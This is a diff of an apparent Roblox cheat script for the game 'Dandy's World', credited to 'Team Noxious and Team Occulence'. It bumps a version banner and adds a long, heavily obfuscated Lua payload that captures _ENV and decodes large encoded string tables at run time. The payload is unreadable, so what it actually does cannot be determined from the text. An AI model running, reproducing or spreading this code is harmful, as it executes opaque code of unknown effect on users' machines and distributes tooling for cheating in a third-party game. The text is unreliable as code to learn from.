@@ -5,10 +5,23814 @@
   \ \_\\"\_\  \ \_____\   /\_\/\_\  \ \_\  \ \_____\  \ \_____\  \/\_____\ 
    \/_/ \/_/   \/_____/   \/_/\/_/   \/_/   \/_____/   \/_____/   \/_____/
    
-   Made by Team Noxious and Team Occulence -- Dandy's World
+   Made by Team Noxious and Team Occulence -- Dandy's World [Version 7.8.7]
 
 ---------------------------------------------------------------------------------------------------------------------------]]--
 
-([[ unfortunate v6 ]]):gsub('.+', (function(a) _yOxfyyHLUdyz = a; end)); Z_VEgmXZAofndqqj=_ENV;CVWieCyBt_myAHf='x&d{ps#(3:_K5jUJ::__JJsp_:h&s{_3JjsI&3(5s&_3JKs _sJ3Kh_pJjpU_{J3pK&3#dK(_&J_pK_>Jsp3pd_dJ3:UJ#p3:jJdpsp4_&p3:KJXps:_UJpp::dUp{_3Ujpd:(U_UJ{(3jUJZN3UUk{&3:UjJU:&j_{(:&{5:pU#{K:;U{U#{UUp{U3UU{{3o&p{::J3p#{#:4UQ{s3_jjUpd#3jj_33U{{d3(j5dJ{d3:jsdJ3_dJ_5j:dU3{j#Kjd#(5jKjj(3jSd3(#3#{d(&j3j_(Jj#d33d53&K3&5(&Kd5j3&J(J53jss(5Ud{((K&&3#K(jZ3{_d>(:5_&J(pd53#jp{_&j(55(&5(&5p35UU#J5sd{#:5p&J(d&3(d5d&(#5KJ5:+3#s5s#_5&&p#:KU&&Q3Kj&_#(K5&&#psUK&&ss5K0OU#KDU##K3Bj#dKs(_j)K#ZU#FKsT_jdd:#KsUK:Y3sjKd(_jid{#J5:&(6s#&_Japs:&p(d5_&d#{K_&pg&s3_KEIss_3_ysp_UJUs{_3JKJspp_sJd_#JJsZ_sJ_pjsp_sJj_{JKpj_dJ(p_sd:{pj_QJsp_:JJpp::UJ{p3_&Jdp(:5UJUpp#_pps:JUJpp::U5J&{s_._5:(UUp&:#UK{U* U_pJ:pU:{U:&(#jjdp#(5{p&:{KU{p:sUj&#3#j5&jUs{33jUd{(35U&d#5_UvpJ3_jJ{p3(#(jU{{3(5&d3(K55&s3KjUd_3pjd{{sjj{d{(35Ud5spj5{&3pdK3(jsd_(Jjd5(d:3(:&U:{Jd(3#j&d#(K5U:{U##J5&d{#Uj3jK(5dd3s55d&(#5:KKd_ssj{&#(Uj{J(sI_U&d(5jd(&5J&K(>5s&3&J#J53&U(&Kj&(#s&((25&&##KKUKp&_sU&p(&KU&{#3KK3Pj{#JK5&p#{K%#sK5PJ#pK:X5X3K3PJ#dK(l5sJs{qK#dKsa_sJKd_5sU5:W3sjKdwsJJs#K#JJ#&_{XKsU_s+(pj_Uwdsj_{S&s5#KJss#_:ss_5JJsp_:J5J&_3a_sd_(J5pJp__KLrs&:sJjps_#JJpp_(Jj_dJKp5_&J#p:pJ__Jp:JJKp::UJ{p#QU(dKd{_:5J_:KJpps:_UJ_#&d#d_3:3Jppd:(U5{JX(#:U:{d3JU::pUJ{U:{U3{Kp&:{j:pp:.{K:{Us{_3JUd_{{#Us{33jUd{(35#&335KUX{:3_jJ{p3(3#jUd3jj{s3(j5{&3pp__j3sUddJ3pj:d5!(33jjdUs_5j{&j#{_3Ojsd_jd{K3J5:p_:5Us&::3Ji&5#_j&{p(((_j{dp(:5Ud&d,(35_((5Ud&(#5K&U&:5_d{(p5:&UU(p&3jj(5(do(&5#&K#U(p53;U5pd&#U5{&3#K(>K3&:(dK(&_(Q&s#5KJ&p#:K5Kd#35{&d#(K5AJjpd(Kp&#s30J(&K:CU#{K#3KXj#KK5fd#)(pU(s#KJ6+#{%:sUK{C3sjKd&ds5K&+#s:s3KyJ(pJK{,:s5_30dsbOds:_5=&s#_:_ds(__JJsp_:JU{{&({jsd_:J5s&_#J:J#_sg&pJ_pJ:pU_{J3pj_{J(p5_&J#pj_aJsp_:J#Up::UJ{p3:jJdp(:5p:p#:KJLp#:_UJpp_QUUp{:3Ujp::(U5p&:p::jj{J3_U_{jU:p{:{U3{j:u:8j:p&3_{K:pUs{_3JUds(#oK8{3:&Ud{(35jJspsj_U{s3UjJ{p3:j5s&s__5{p3(j5{&3#jK{=(s&:dJ3pj:dU3{j:dj3dj(d5:#j#dK32js#3(Jjsd:3&j{d3(jUpd5(5j{d#31jEds(_U&{j(:j&d{(55jdd((jUdK(#5JdB(35_&J(p5:df({5:&j(#5(&j(&j33J(h5(&_(#5p&:#Ujs35#j5s&((d5&&##K5y#5#_5{&p#:KU&{#35J3##(5&&&#5KK&*#sKU(d#pK5+U(#K3qU#d5:(p#&Kj;K#dKsq_sJjp/UsUK_^3#pKdk3s55{&#sKK3?s#z_JMps:_U&3s3K#=ds3_5M&s#_KV_ssK&JJsj_:!ws{_3V5sd_JJ5s{_#JKs8_s.:pJ_jJ:pJ_{JJpj_dAUp5_{J#s{_cJUp__{0&p:_&J{sd:jJ{p(:5{Kp#:jJWp(:_UJpp::p#p{:3Ujp{:(U5p&:jUKp>:sU_p::pU:{U:&#(Us{(:{j_{53{U:{EUs{U3JUp{:35:dj:{jUdpp35U&{#3:3Jj#{_(Uj5dU3_j&{{(_UGd(j5{(3#jK{W3{#dK_+5#pK#3{Updj3dj(d_{&3&5_d3(_j#&j(J5#d5({d33#jdd((55Jj#d#(Jjsd3(p5U&55U{&(35jdd(s(K5dd###KJ&j#J5K&d(pKKd&#3&U(d5(&5(&U&&K(25sd5j(5p&_#U5#&3#j5d&jK35&&(#K5p&s#KKJ&p#:5d#J#3Kj&d#KK5&d##KJ#5#sK_cJ(pK:9J#{5_(s#dK3b5##K#OK#0KK(3sJKs7:#UK{y:sjK{k(#PMjR#sKKP&ss_KgXp#K&#={s:_jz:s(_5v&s5J(zrs#__k_sp__JUs{_3-&_U_(J5s&K&JKs&_sJU_K_pJ:pUK{J3pU_dM:Kp_&J(pK_&Jsp_:JJ_:s:UJpp3_jJdp3:5J&p#:Jp5ps:_UJsp::UJp{__sspd:3U5pd:#UKpDKsvU{J:sU:{J:{U_{j_pU({5:dU#{J:SUs{__&d&{:3JU{{53jUd{(:dJ({#35U/p_3_U*{p3_jU{(Upjj{d3(J&{&3(jK{pU&j_dJ3pJ{dU3pj3{JU_j(dj3&j_dK3vjs{5U(jpdK(Uj:d3(jjdd(j{j&d:(Kjyds(_5Jdp3J5Uds(3jOdd((55d&jj5Kd&(s5_&J(s5:&U5K53&j(d53&5(&5#dd(O5s&_#J5_&:#U5{3KU&{p3bj_d3&#( 5i&s#_{{(s5Kd_(3#_Kj&d#(K5&&##KKsn#sKKiJ#pK:v5#sK3aj#dK(M5#&_#p_#dKsS_sJKpH:sUd{p3sjKd-(s5K&r(s5KcRss__J9ps:_U6ss3_jzds(KdH&s#_KH7_J__l&sp_:JUs{_3Jj#J_(JJs&_(JKsh_sJ_ss_pJjpU_pJ3pj_dJ(sp_&J:pK_dJsp5:JJp#d:UJsp3:jJdp_:5J&p::KJOps:KUJpp::ddp{:3Ujpd_5U5pd:#UKpr:sU_{JUKU:pD:{U3{j:dU({55dU#{5:YU({_:&UpsJ51U{{:3jU3{(3jU&{33KUp:&3_jJ{p3JjU{p33U&3U3(j5{&:{jK{&3sj_pp3pj_dU3pj3dj3dj(3{3&j3dK3}jsd_(Jj_dJ(Uj#d3(jjdd3(5j{d#(K{5ds(_5Jdp(:5Ud{(3&rdd((55d{(#5Kdy(sJ(&J(s5:d&({5:&j(#d{&5(&5#pj(/5#&_#Jj:&:#J5{&3#j5d&(#5&3&##j56&s#_KJ&p#:UJ&{#:Kj&p#(KU&&35UJ&0##K_p&#pK_uU#pK3&&KUK(75#&U3LK#&Ks6_5:Kpk_sUK{S3sjKd&s3_K&;KsKUd4ssK_JGss:KdsJs3_jOd3:_5Vds#_K&sss_KJJs(_:JUs{_3(#sd_:J5s&_#JKs K(&ppJ_(J:s{_{J3pjKp&&p5_sJ#sH_lJsp_:JJ(p::JJ{p5:jJpp(5dJpp#:5J*#d:_JOpp:jUUp(JpUjpd:(!:p&:(UKppJ&U_{J:p&K{U:pU3pJL#U({j:&Uj{K:^Usp5S{Up{K3UU#{33jUd{(J#U&{:3KUE{s3_jJp#JjjU{(33Ud{d3(j5{sU:jK{d3shKdJ3sj:dUj_j3{{3dj3d53&j#dKK#js{&(Jj3d:(Uj{d3:3jddJ(5jsd#(Kj9ds335Jdj(:j&d{(35jdd3d55dK(#5KdE(s5_&J3&5:d:({5j&j(d5(&53K5#d((65_&_#J5p&:({5{d&#j5U&(#U5&&#(j5^&j#_5(&p(dKU&{5(Kj&K#(5&&&##KK&N({K_&(#p5&cU#5K3dj(#K(&p#&KUQK##KsH_(3Kp&WsUK_N3#sKd%(sjK&r(sKK#es#&_Jn3##_UPss35J ds3_56&_<_KF&ss_5JJsp_:JU:j_3Jjsd_:J5s&_#JK_3_sJ_pJ_sJ:pU_{J5pj_dJ(p5_(J#pK_2J{J:pK:&J5p3J{pj:jJdp(:__&U{p_:(ps:JUJpp::U5J#{s:dJd::U5p&:#UKpZ:sJU(J:pU_{U:{U3pd:dU({5:{U#{K:MUs{_%J{#(:3UU3{33jUd{s{J(UjK{KUr{_3_jJ{p3(3Uj2{(3p{d3Kj5{&3#j:j{{{3:dJ3_j:dU3{j#j:{o(5j#{&j#dK3qjsd_:sjpd:(Uj{{j(jjdd((5j&d#(Kj#:{(_5Jdp(j5Udp(35Udd(Kd3d&(#5Kdp(s5K&J(3ds&U({53{d(d53&53{dU&K(v5s&U#J5p&:3n&p&3#U5d&3#55&&##K5{&s#_KJ&##:5A&{(_5J&d#3K5&s##KK&2((5(WJ##K:PJ#{K3>j#dj{;5#dK#8j#0K(R_(&5U}:#SK{D5sjKd1(#UK#8#sUK,t#s__Jmps:jJ9{s__jYps(_U;&s#&&!Tss__JJsp_KJU#sK{Jjs{_()&s&_#JKs15dJ_s&_pJ:pU_{J3pjK5J(pj_&J3pK_&Jss5K_Jpp_:UJ#p3:jJd#(_sJ&p(:KJ&ps:5UJpp_sUUpp:3UUpd:3U5psJdUKpQ:sU_{J:sU:{UUKU3{j:dU3{5:&U#p(:DUs{_3J{p{:3UU{{:3jUd{(:U&_{#35Uc{(3_jJ{p_:U({{3:jj{{3(jj{&35U&{S3(j_dJ3pj_dU3pj3djUUj(d53&j#dK3*jsd_3jjpd_(Ujsd3(Ujd{::(j&d((Kjdds(_5Jpp3p5Udp(35Udd(_55{{3s5Kdd(s5U&J(p5:&U(p53&U(d5:&5(d5#&K3(5s&_#J5p&:#U5{&3(35d&(#55d&##K5?&3#_KJ&p#KKU&{#3Kj&dU(TUs&##KJ&i#sK_6jt(#(Kj#{KU^j#dK(C_vj#pKDi_#sm_sJKpE:sU5&;3sjKd&:5jK&G(sKK{2ss__J&#sj_U,ss3_Jmds(_5&{#U_KA{ss_KJJsp_:JU#U_3JJsd_:J5s{_#AjsU_sJjpJ_#J:pU_{=_s;_dJKp5_dJ#pK_DJs#(:JJ(p:_wJ{p_:jSp_J:5Jsp#:jJbps:_D&#s::J{p{::Ujpd:(U5ps:#UJpe:(U_p&:pU:pd:{U_{j:pU(py:&U#sp:mU#{_:&Up{:3UU{{U3jU{{(35U&{#3KUq{K3_jJ{p3_jU{{33jJ{d3(j5{&3_jK{f3sj3j(dJ(:dU3(j3dj3djsjKdJ(sdK3Djsd_(Jj:d:(Uj{{_3:jdd((5jdd#(KjE{(3#5Jds(:jqd{(35jdd3d55d&(#5jdB((5_&J(J5:&U({5:&j({5(&5(d5#&K(m5#&_#J5pU&#U5{&3(JJJ&(#55&pj#K5m&s(Pj#&p#:KU&(#3KU&d#3K5&s5dKK&/#sKUgJ#sK:&dKJK3kj#dU(%5#dK#+K(_Ks-_sJKp7:sUK{O3K{Kd+3s5K&}#sKK%6s#{_J0ps:_U,{s:_jdd(K_5B&s#_K!}(p__&&::_:JJs{5dJjsd_(eU#U_#Jjscj5J_pJ_pJJsp_{JKpj_dJ(pj_&J(pK_G#&p_:JJpp_:UJ{p3:j#3p(:UJ&p3:KJ&ps_5J:pp:KUU(j:3Ujpd_:J{p&::UKsp:sU_{JKpUj{U:#U3pX:dJ_{5_{UJ{K:pUsp{3JUp{:_UJs{3:&Ud{K35J#{#:jUs{s3JjJp33:jU{{_3L&{d35j5{#3#U3{A:(&{dJ3_j:pd3{j3dj_dJYd53(j#{&3,Tpd_(J&3d:3sj{d3(jjdd(3Ujsd#3{j>{J(_5Jdp3KUpd{3&5j#s((55d&33j&d^(J5_{U(p5:&U((5U&j(_5({j(&5(&K( &5&_(K5p&U#U5{&3#jd#&((:5&d&#K5=&s#_5p&p(sKU&s#3KJ&d#(53&&#jKK&K#s5#=J#pK5SU#_K3&:#d5dL5#s5{=K#3KsdssJKs%:sUj&z3#sKdGJs5K&r##&K#+s#d_Jl(s:_JP{sU_j=d5{_5%&s#_jovss__JJ5c_:JUs{_5Jjsd_(J5Kj_#JKs9_jJ_pJ_pJ:K__{J3pj_sJ(p5_&J#K(_zJsp__#Jpp::UJ{Kp:jJdp(:jJ&p#:KJ}35:_J3pp_&UUp{:3UjsX:(J#p&:#UKpu:sU_p(:pJd{U:sU3{J:dU(pp:&U#{K::Us{_3JUppK3UU{{33JUd{(35U&{_3KUH{s3_jJ{p3:Udpp33jj{dpUj5{d3#Uj:33sj_dJ_dj:dU3{J3p&3dj(d53&j#p_34U({#(Jjpd:_dj{d3(jUpp{(5j&d#::j%ds(_UJ{&(:5Ud{(35jd3((jU{#(#5Kd-3h5_&J(p5:{K({53&j({5(&5(&j3{s(Z5s&_3J5p&:#Ujs3!#j5d&(3J5&&##KU#p(#_KJ&p_sKU&p#35:&d#K&3&&##KKp5#sKK)J#p&&fU#{K3,U#dK(h5#{d3OK#<Ks2KsJKpy:(YK{w3sjKdeKs5K&b#sjddyss__JM#s:_Uz{#__j8ds(_5d#s#_K2+s(&5JJsp_:N{s{_3Jj#pj#J5s&_#{(sn_sJ_#&_5J:pU_{{ppj_dJ(sU_:J#pK_qd&p_:JJpp:K&J{p3:jJdp(:jJ&s3_(JDp#:_dKpp::UUs{_3Ujpd:(d3p&:(UKsd:UU_{J:p&#{U:{U3pJv#U({5:&U3{K:HUsp5J_Up{_3Ud{{33jUdp:_3U&{(3K&3{s3_jJp#:5jU{{33Us{d3(j5p{3(jK{*3sjJdJ3pj:pf3:j3dU3dZJd53&j#{j:3jsd5(JU5d:(Uj{{_(Jjdd_(5g:d#(KjH{(UU5Jd3(:j&d{(35jdd(K55d&(#5KdM(:5_{&3{5:&U({J &j(d5(dU(55#&K(OU&&_#J5pdK3#5{&:#jU5&(#55&d3(35C&##_J5&p#:KUds#:Kj&d#(U(&&##KKdd#(K_%J#pJ3fU#{K3&Jj#K(Tj#&j(gK#kKs&5:JKpzKsUK_*3sjKd&:(:K&u3sKJdtss__J&##:_U)ps35{;ds(_5&{#5_KtIssK_JJsp_:&T#(_3Jjsd5dJ5s&_#Ejs#_sJKpJ_5J:pU_{i_s__dJ:p5K{J#pK_.!(Kd:JJ(p:_#J{p3:j7pK_:5Jsp#_:JPps:_l&sJ::J{p{_AUjpd:(JUp_:#J&poj{U_{J:pJKsd:{UJ{j:_U({5:&J3pj:.Uj{_5pUp{:3UJspK3jUK{(:pU&{#3KJd{j3_U:{p_KjU{{33UJ:_3(U({&3UjK{b3sU5_d3pUsdU_:j3dj3dU:{j3&U{dK33jsd_(JU#{K(UU&d3_Kjdd((5U{{#(KjJds3d5Jdp(:Ubdp(3jjdd3:55d&(#jj{u(sjK&J(55:&U({j_{d(dj:&5_&5#&K(hj(3d#Jj(&:(#5{&3#jjp35#5js&##55N&s#_KJ&U#:KU&{#3Kjd##(5Udp##KK&D3UK_?J#p5K&J#{K3ej:_K(D5#&53d(#CK#b_:&KpQ:sU5s&JsjKp)(:pK&+#sK5d&5s_Kd!p(d_UE{s3_j&ds(_5)&s#_Ky{ssK5pUsp_:JU35_3JjsdK:._s&_#JK(:_sJ_pJK#J5pU_pJ33s_dJ(p5K{&?pK_dJs3{:JJpp::Unpp3:jJdp(:5J{p#_jn_ps:_UJ#K::UUp{__J_pd:(U5#::#UKpv_(sd{J:sU:#::{U3{j_p{_{5:{U#({:/Us{__&Uj{::&U{(s3jUd{(:UUs{#3JUysd3_jJ{p:KJd{{3jjjpd3(j5{&:3Jp{63Kj_p53pj:dU:sj5dj3:j(pd3&j#dK:dUsd_3(jpp#(Uj{d33J{_d(3sj&#3(KjDds35{5dp3{5Up,(35jdd3:U&d&3&5Kp((s5_&J3#jJ&U(J53ss(d5(&5(&j#&K(>5s&_#Jj &:3Q5:&3#j5dsK#55&&#(j5j&s#_KJ&U#:KU&{33j#&d#(K5&&##U5&r#(d56J#sK:&d#{K3Pj#ddU>5#&K#-j#wK#F_(&55R:sUK{&:sjKdL(#UK(7#s5K/&Js__JLps:5:/{s3_j9ps(_U1&(#_5bess__JJspU_JUs:K3Jjsd_(:ss&_(JKs _sJU_K_pJ:pU{5J3pU_dJK_3_&J#pK{_JspK:JD#K&:UJ{p3jUJdp(:5C{p#:KJ6ps5UUJpp::VR3d:3Ujpd_UU5p&:#LKpU:sU_{J:pU:(p:{J_p{:dU:{55:U#{K:;J({j3JU({:jdU{{33jJp{_35Us{#5{U0{s3_jJ{53:Ub{{3_jj{#3(j5ps3#jK{83(j_{&3pUKdU3{j3djKjj(d53&U3#p3Zjsd_3:jpd:(UJ{{_(jjdd((5j&s((Kjd:((_j0dp(J5Ud{(35jdp((55d&(35Kd&(sj5{&(p5:&U:353&j(dj:{&(&5(&K(p5s&_#Jj#&5#U5s&3_^5d&(#55&dd#K5&&s#5KJ&##:jods#3KJ&d:JK5&&##5jd{#sKjSJ#3K:kU#{5_3&#dKKu5:pK#vK#fKssssJK(*:#}K{a_sj5p&ps5Ksl#:{KBbss_5&XJs:K{H{s5_j)ds(KU&ss#K&PB33__JJsp_:&rs{_jJjsp_(JUs&_#&3sC_#J_sR_pJUpU_{JUpj_dJ(pU_&J(pKKddUp_:JJps{:UJ{p3Kj;Kp(:5J&p#:KJJps_5#{pp:_UU#d:3Ujpd:(UUp&:#UKpd:sUK{J_#J_{U:{U3#d:dU({5_{Jg{K:&Us{U3JUp{:_fJ&{33JUd#_35U&{#3KJj{s3KjJ{#3:Uv{{:_Us{d3:j5#:3#jK{R:(UUdJ3(j:{d3{j3dj:ppKd53sj#sU3Fjsd_(J&Jd:3&j{d_(jjpd(3UU_d#(Jj sj(_5Jdp3KU:d{(j5jd#((55d&33jpd<(K5_sd(p5:&U({U&&j((5(&U(&53&K(=U?&_(I5p&_#U53&3#jj{&(#55&&3#K5&&s#_&(&p#:KU&p#3Kj&d';CoAiHOMuUkcImBzCd='um-#64=C:jnSq(oJ6qmjH-((S6:nmo#=mJJ-qmnqCS4S#6q:oo:a4q#=m*o4U-(Jn(:4=nJ:--qC(-nJC(44#nq:oqjCn-CJ6(-4Dnj:q4=CC-6Jm(J4(n=::o#C6-mJo(q4nn#:=6dCm-oJS(j4Cn&:-m(Co-SJ:(=46n(:JCnjC:46##K4o#q#qonSCj4m#=q6o-j4=-6C4--JJ((4Sn6:CBmj#mx(n4SS:==m#ommn=q6C=6C--Gmq-oZq44k=o-m--q#n#:Cj(=:6#-,J#::n=4:-=6:((S4qr4:C#4n-nqg(JCj4o:pm=m(qqn=:=46C=_noCSJjj=kCo=#ooEqSJqf=m6mGn-j(SneSC4=#nmGo#Sjn-:m44#-z((3J=(#nmCj4ooqm4S(So4JC#d:-S_-joS46J#64=ojJ=n-C=6j#:mm(o}3qCjo6=mK#oHqo#q=4-Cm-#o:JJjoConH#4mmojSj:JC6j=4j+:m;Sn:XSmCq4C#6ZCjqSn=q#n4qoJqj(#=q:C=o#o(6J#:(C-j6-C#=(oS6jn=::n4--C(1jnS:j(-:6=JjJnjSCS66=#m4(nJmj#C46S-CJCq(S4j1==6XmSo6+noCS4:(C-EI-=(m(-C#:Cmq#Jm=S-qj=#6:=nJJ(=o6:n4(6nm:#nq(no:==--64--!JC(n==:4#CJqm#S-j-S66C--JJq(n#::nn6#6j-6J(j6SnjC=4#(--S9qJ:m4##HH-o4Sj:an#CnBo#=mmJ_C=jo=46jmS8q(nSmj6-p6:LJJ#q4CJ6q=oHmqnJCjSjJCC=N-qd4o:qn6o=j4M-?S=(CnJj:=6#(-}f-:o=j444j#qhqn-qmn-:#6J-(P6j:SC4m#:4oJCq6:oSq:n=m66(NoJnm==C(mJJqmoSmSSjC#C+(J-m6nnS==-=:Jo-6smqJnC:qmn#joSSSj-C66(-Con2(o6C:n5CS4noXy:qJS#:4C=66mSJo:nS-Cj4(-JojS=(:=S#64oy4m4JGq:jjC:6SJjJ(oKSN6==46=-CJ#::nC4jmo#4(CS6(==S64-#oJq4nnqq==#:m#o(S=(6:C::-jpj(-J:(4n#CS=!ooY(SJ:J=j64mSJ4SoomS:6qC66J-oS6(qn#:C4j6nm:oJ(-4o:=6(#mt#S(:nnq#JA:-q(jJmq(=4=j6qmqS-(mS6:6mn#jmqoq:-nm:-=#-J/(o6C:jC#mm:#o(Cn6=ojq=n6m-6SlqJ:m6=4(Jq(qJoq-CT#(m#J:mnS4:oj6#(N6#4Pp(SS::S-y#oJTSoocC6:m4:J1pSJ-q-4:CCmmJ=m:n(:q4o#omooqgonmn(46#mJ:m=JS:=n64C4:Jj(jn-qmC##:6JJmqJn::-=4-Jc4ooq=n-C(4jmq6-mJo(q4nn#:4m>jgnnSSJ46CC6oonemjS:vn-#=m4mSqnj4:-4(-n6q(JSSqCCL#==6#-{joqC:jC6j+o-4q6n6q=4j=4;4(Sq%o-Cq:6-oL:qqJ-qJj(C44no:OCSj::=4#om4oJS:(SS-6==o6j-:no(=j(:m4#66m-ojqq4::X6C-SJ(SC:6n=#jO--:(#(=SJj-=m6qmSJS(6=:::m(#nmCo4S(n-#B6JUmqoJA:-4(-=6q-jJCqJS66-=-6Smoo((:nC:C=)oqcnn:So4(C#-4-CqC(nC.jq=j4--(%6(n==:o#66C-#on:nnm6#46J=LjnS::nn#qmCojJJo-S-6:Cj66mJJqqJ=6j-=n6Cmmn=q6nj#64n#Cw4((q-45C:-m--q5n-q64=#m^#m(J6j&St4j##J-H=Sj:w=m:=46-SKojnS=nN=(6#-CS=(4S:::mo66-moJqCnq#n4jASm:S,SonJ:66Joq{-nk:-n6#=mmo#S((nSC:44(6-(AoJnmn-6E4CJ47Jo=Cnn-6S-4o6J:n:C-jo=q6#-=S-(m:#:n-:6m--qoq4n44S=j#Sqqo#:mjCC:4j-4v#(n=oj=#Jmj(:oqj(==j-=<#Cmnn=q4CCCj=qg4q6(::=4-=J4/#mJ((SS-6==omCJmS)q6C:#o=n#:WJJ-ConS=(4m-#((o>qjjq=S4=-4i4(oC-::-n#((SJoqSS6:J==#qq:J=:6=o#q4:-(_nn6q=4:=SBqmoS((#S=:=mq#SmqJ(qjnCCom-#no#S(CqjU6-,n#=M6(SSo6n=jmS-So((mn#:4==6Cm#Jmq:4q:6-(yCq=(n::46:/6o-4a:j6S#=4C4#CmSo(q4n:6==:LvroJJ(6jJ#q4-J5(-J6:==m##a(oCJ4n(Smj6=6Jn-^J(qSn#::m=#6oCo::==::nmqJoqjo6nJj-=4mJ-mS=(4S:::mo#(-7JA:=n4::4:oob(ooqJjSCj4Vo6;#j(:6nn6#m%(n2:(=n(jLmq#So(S-qj=:6:=n^-gCnjCJ=6:=-0-6Qdj=Sqjj=C#J-6S-(m:#4C-SKnoCS::-n4Cqm*#:m#J-C:nf=C6Sm(do(qS#j=--6nmmJ4qC:m6oCpZ#qqoSqojo#64##6m4omC=j46C_q-#q#n-q64:=6#(((S#j:Sn4--qD4(Jn6q-C4C=mCJCqdo=q#jm=j6o(qJSn(:m4=#=}ooCnqqJn=#n=-#(mqn-qnjmC46C#:D=((qG6qC6#SmJJmnSC:jn-(J=m4J:q:4oC(=;#Tq=o4q:j:-o6(-owJ(SCG:J6mV=m(SJjqSo4m-Sh:(Cn(j-S66:4=dm(6joSq=JC0mmJmSnoSS=jm=o6m(=J6n=C6j=-n34(Jn=qmn:C:ro-(qCnqqo=#6m64oo(6n-q64C=-#oo6noqqSm#q4ni(ionJ:J4:CC-jooT4nC:q=_6<vSomqSn4Co4jmo66-moJqCnq#n=/eSMqn(qm4=Cj4NoqM#j(:-n6#:m#mqq=jC:=4-C6^Comooj(4o:q4n#mm6nLSJCm#=6(o(qqoo:#=#==?C((q-o6Cq:4##X4qoJ6(mjJCC4qon9jSS:j=66mmCJ-Sn((S66:C_6S-nS_(:jJ:#446=m6oSqo4n:-6j-(JJSj:=n:#SV6#{(4o=SSj6C46Cm=J#(nC(:m=6#6qnojqnnSCC44-qqT(JCj=z:=mJoqS=o6S-:j=qJ:mCqj:on46C-66=(jSnj-4J#4mn#q(Unq:64(-=6q-jJCqJS66-=mm#omSoj:CC6nm-#45qnbq:n#:-/:#KJC(Sn(jo=q6#-=S-(nnm:44Cmm(oWij#4qC4-(oqG?S-S6=n=:mCJm(9(fCJ4j###:oCqmjnnO6J-j_j8:SCj8C#C?-C><Jon(:==m==m4oJqqqoC(4=#j#=o4SJjojo4#-=-qo#S(Sn=j6--m--(=S#Sk4J#nm#m:qCnmC(:T-o#6o:o:jCCm6J4!JJ(jS:S:=C6mmo-{qJn::C::#CmmonJ}jJC:444:hnVqq#j(jn6j--H)0-Sjjmjr#JmjJ=J:n(:=:=#4WJonoon#CJCq#-rnvnqkj4j:6o-=-=(SS_S6=S646-J_J=nnnn4j##mmm-qmjSCnCn-j,#oVo-jm=n6j6nJj(#nqS-=m#nmCmnqSqoC(4C#4#=o4SJjJjo44-o-q(SS6j#j66n-#--(mnS:::n#jm#J4J-nmCn4S4nLjo#qPq-Cm6n-n-nogSnS:===q-M-PqJnj:C::#CmmJ9J;jJCj4=4:XCogSJqk=J6j---:(CS<:(j06-66JS(6(-:m4q#4#nojq#n-n-4m-n^4wnq!jnj:6J-j-=((S#S6=##qmjmq(mn:nn=;#6#:o(q-q=Cq4m46l-*:SSSq=S64-6-6(SS#S-=j6-6_oJq:nnn:4C#rUSmGq6q6CS444-*m(SS4Sn=j6#mq--(jS#S/=C#J#oo(qCn=n=44-Jz(GoS(j:CmC=-4Joom(oj#=S=q-GJnJnno:n::#omVm=q4joCJCo-q#-o4o=j4=J6o6oe4(((qj#=q=nmjJ-(6(-:m4n#4#nooooj(C=444=e4(JS:So=(6C-4-=(4no:j:o#(mCJ6J=n4CJ4o4oU(oCq:q=C46J-S-o((SCj#j=6Smo-6(#nq:C:q#Sm6J-J6n::m:-#=mcmlq#:nC(:m=6#6qnojqnnSCC^q-S((n-Sj4:#:4nJ4qojj=J46C=kjm4q-qj=vCo#m#-(#S#Cqn-CJ6(-4Nnj:SC=j#Jm=onqnn==::S=-J=moJj(:4o:=6(#mi#J6q-jjCq3:#vJC(Sn(=C#64=ojS-(J:#6:=:6#--n:(4=4CC4o-oq6((j(:^=-f=-J1qj6qm=#=C6nmnSaqJS-:-m:#Cmnon:FjJ:-4-o:5ConSn4r=J-mo=J(j(:-4j##Z#(jSJjoC#4--=J1FJJ-q-4:Com6-4qjS4qgj(=S6#-:S=(6:CjJCSm#m:JS(:=ICJ#mJo- S-::==::4l-nSo(qqm6qC-6Jm(J4(n=:jO#j63(o(=(6:(=o64--ooo#:-jj#C-#-=JC(Sn(=CC-mjmqo((nn#4(4J.Jm#J=q=4q:-4J-(v4onC:j::m46-#*o((S(j=--6S(oJ4j#S=:#=q6CmoJ6:ijo=J4#-4((omq6j6-n4O-(JS(#S:6==omC(qJ6((SvCJ=n#jmjJ-:=jC#o4:oJ;qojSC:JC6w-#8q-(o:C46C=R:o#S:j=S:6S-6oom6JmSJjCCqZn-:(SJ#q(nj#-4S#CqLojq4jJ=:64m#oS(z4o:S-JJj(=J::n=4-o46#mJJ(CSq6n=jmSo:OnjqCC6G==6#mmojqo4q:=-(-jq6J4qIjSC:6SoVBoo=q#:(--6!-4SMqojJ6oCa_-(Jo#SSn66-4CmJm6J#qmn-C6#qo=O6joSm4--:6M-jJqqSS=:4=4#o(-n(q#C4:=mC-SqOoqSjn-C(46-nS=(4CC46C=E:o#nqqSnoCom(J=(mnSSjC##:42#jwq(Sq=j4C46oo-S(om:4j4-CO=-:Snj44o:n4C6kmSJ-q:46:m):-Ckn(nCj4--(6CmoS-(J:#4(--K6-=S:q:=4:n4:-Jm-joqS=J-oN:-o(Cn6q=4:#-zq(=J-(qnjCJ=#J-mmJ6q64nCj4q-qq-o:q4j#=S4?(o%SnJ=Jj--y4mmqJC(6nC#q4Siqm(nJ:oSh6-m(o=}6ojC6j-=#m-#6q=n-nCCJ=q#4oJJ=j6njCm==64m#J6q=:o#:4=J2i#n6Cnj-CS6om(O:(CSCjD-6JJm4qC(:=jC(m-#oISJ6qJn=Cq9:-Cqjn=q:4n#4Jom(B8(X=J6:-#J(mqq4( =C6==:Jn(4joqmj:-q46o4qnoqCo4n#Jmjo=s:jnC6#o=q#nmmJ6:Pn:4mmo6!(-nqC=jn#:4n-JzjS:Sm:o6mmq(qJ-q#C-j6-=AmICSx:=nC#nm6ooq:(onJ4o:Tm-oJJ#qSnoCJ-o40o-Soq#jS6n=qJo(:(JSjn4:-.nJ6m=n::-44#.m0#-q4joCm6(-6#nKSSn(q=o6S6J-Cln(S:nnq#omnmJJCn=q:4n#4#Sm4+m(o==4aC-^6(oSm:(nq#Jm4JnmqnJ::=-#4%Joj(4o6:S:C-(6qJmJ4(:n:#o4(6gm!n=(-jJ::=##nm_jqqO4oC(4(-So#S6jKC==ST-m:ojj:Sn6q-C-((#ojqqjq#S-C#-q:o:Cq=##jEo(o/a(=jpCC=#{<onJqqoS=:j-=mjmSq#(>nj4=Eqo(qCS#So46C6E:oqqCn#C6664-m(mSnSSCn4=j=-6C(((nq(:-=q4Jm6o#((Cm=(CC6jH=)(qnSjjC=n>JJ4S